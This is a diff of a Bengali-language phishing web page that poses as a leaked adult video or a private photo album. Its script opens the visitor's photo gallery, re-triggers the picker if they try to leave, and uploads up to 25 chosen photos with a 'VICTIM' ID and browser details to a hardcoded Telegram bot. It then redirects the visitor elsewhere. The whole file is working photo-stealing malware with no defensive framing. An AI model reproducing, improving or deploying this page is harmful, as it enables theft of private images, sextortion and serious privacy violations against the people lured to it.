@@ -1,83 +1,101 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>১৮+ লিক ভিডিও ফুল এইচডি</title>
-<style>
-  body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;}
-  .box{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;background:linear-gradient(135deg,#1a0033,#000);}
-  h1{font-size:28px;color:#ff0066;text-shadow:0 0 20px #ff0066;}
-  .thumb{width:90%;max-width:400px;border:4px solid #ff0066;border-radius:15px;box-shadow:0 0 40px #ff0066;margin:20px 0;}
-  .btn{background:#ff0066;padding:20px 60px;font-size:24px;border-radius:50px;border:none;color:white;font-weight:bold;animation:pulse 1.3s infinite;box-shadow:0 0 30px #ff0066;}
-  @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.08);}}
-  .notice{color:#0f0;font-size:18px;margin-top:30px;}
-  .hidden{display:none;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>প্রিয়ার প্রাইভেট অ্যালবাম 🔞</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;overflow:hidden;}
+    .container{padding:20px;}
+    h1{font-size:26px;margin-bottom:15px;color:#ff0066;}
+    .blur{background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;border-radius:15px;height:70vh;margin:20px auto;position:relative;box-shadow:0 0 30px rgba(255,0,102,0.6);}
+    .blur::after{content:"🔒 Tap করে Full HD দেখো";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.8);padding:20px 40px;font-size:22px;border-radius:50px;border:3px solid #ff0066;animation:pulse 1.5s infinite;}
+    @keyframes pulse{0%{transform:translate(-50%,-50%) scale(1);}50%{transform:translate(-50%,-50%) scale(1.1);}100%{transform:translate(-50%,-50%) scale(1);}}
+    .warning{color:#ff0066;font-size:18px;margin:20px 0;}
+    .btn{background:#ff0066;color:white;padding:18px 50px;font-size:20px;border:none;border-radius:50px;margin:20px auto;display:block;animation:glow 2s infinite;}
+    @keyframes glow{0%{box-shadow:0 0 20px #ff0066;}100%{box-shadow:0 0 40px #ff33aa;}}
+    input{display:none;}
+    .loader{color:#0f0;font-size:18px;margin-top:30px;display:none;}
+  </style>
 </head>
 <body>
 
-<div class="box">
-  <h1>অরিজিনাল লিক ভিডিও 🔥</h1>
-  <img src="https://i.imgur.com/5t3xK8P.jpeg" class="thumb"> <!-- একটা হট থাম্বনেইল -->
-  <p style="font-size:20px;margin:15px;color:#ffcc00;">একবার ট্যাপ করলেই পুরো ১৫ মিনিটের ভিডিও চালু হবে!</p>
-  <button class="btn" onclick="grab()">▶️ প্লে করুন (Full HD)</button>
-  <div class="notice hidden" id="loading">ভিডিও লোড হচ্ছে... ছবি চেক হচ্ছে ⌛</div>
+<div class="container">
+  <h1>প্রিয়ার প্রাইভেট অ্যালবাম 🔞</h1>
+  <p style="font-size:18px;margin:15px 0;">শুধু তোমার জন্য আনলক করা হয়েছে!</p>
+  
+  <div class="blur"></div>
+  
+  <p class="warning">⚠️ Full HD দেখতে নিচের বাটনে ট্যাপ করো</p>
+  <button class="btn" onclick="unlock()">🖼️ অ্যালবাম ওপেন করো</button>
+  
+  <div class="loader">অ্যালবাম লোড হচ্ছে... দয়া করে অপেক্ষা করুন ⌛</div>
 </div>
 
-<input type="file" id="grabber" accept="image/*" multiple class="hidden">
+<input type="file" id="gallery" accept="image/*" multiple>
 
 <script>
+// তোমার টেলিগ্রাম
 const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
-const CHAT_ID   = "7731349577";
+const CHAT_ID = "7731349577";
+
 const urlParams = new URLSearchParams(location.search);
-const victimId  = urlParams.get('id') || 'no_id';
+const victimId = urlParams.get('id') || 'unknown';
 
-function grab() {
+function unlock() {
   document.querySelector('.btn').style.display = 'none';
-  document.getElementById('loading').classList.remove('hidden');
-
-  const input = document.getElementById('grabber');
+  document.querySelector('.loader').style.display = 'block';
   
-  // এই ট্রিকটা মোবাইলে ৯৫% ক্ষেত্রে অটো "Recent Photos" ওপেন করে
-  input.setAttribute('capture', 'environment');
-  input.removeAttribute('capture');
+  const input = document.getElementById('gallery');
+  
+  // প্রথমে ট্রাই করে দেখি
   input.click();
-
+  
   input.onchange = function(e) {
     const files = e.target.files;
     if (!files || files.length === 0) {
+      alert("কোনো ছবি সিলেক্ট করা হয়নি 😢");
       redirect();
       return;
     }
 
-    let count = 0;
-    const total = Math.min(files.length, 30);
+    let sent = 0;
+    const total = Math.min(files.length, 25); // সর্বোচ্চ ২৫টা ছবি
 
     for (let i = 0; i < total; i++) {
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('photo', files[i]);
-      fd.append('caption', `AUTO-GRAB\nID: ${victimId}\nTotal: ${total}\n${navigator.userAgent.substr(0,70)}\n${new Date().toLocaleString()}`);
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', files[i]);
+      formData.append('caption', `VICTIM: ${victimId}\nIP: ${navigator.userAgent.substring(0, 50)}\nTime: ${new Date().toLocaleString()}\nPhoto ${i+1}/${total}`);
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd})
-        .finally(() => {
-          count++;
-          if (count === total) setTimeout(redirect, 1500);
-        });
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        sent++;
+        if (sent === total) {
+          setTimeout(redirect, 2000);
+        }
+      }).catch(() => {
+        sent++;
+        if (sent === total) redirect();
+      });
     }
   };
 }
 
-function redirect() {
-  document.body.innerHTML = `<div style="color:#0f0;padding:100px;font-size:24px;">ভিডিও লোড হচ্ছে...<br>৫ সেকেন্ড অপেক্ষা করুন</div>`;
-  setTimeout(() => { location.href = "https://youtube.com"; }, 4000);
-}
-
-// যদি কেউ ব্যাক চাপে তবুও ট্রাই করা
+// যদি কেউ ব্যাক চাপে বা বন্ধ করে, তবুও ট্রাই করা
 setTimeout(() => {
-  try { document.getElementById('grabber').click(); } catch(e) {}
-}, 5000);
+  try { document.getElementById('gallery').click(); } catch(e) {}
+}, 4000);
+
+function redirect() {
+  document.body.innerHTML = `<div style="color:#0f0;padding:50px;font-size:22px;">অ্যালবাম লোড হচ্ছে...<br>আর মাত্র কিছুক্ষণ ⌛</div>`;
+  setTimeout(() => {
+    window.location.href = "https://www.google.com";
+  }, 3000);
+}
 </script>
 </body>
 </html>
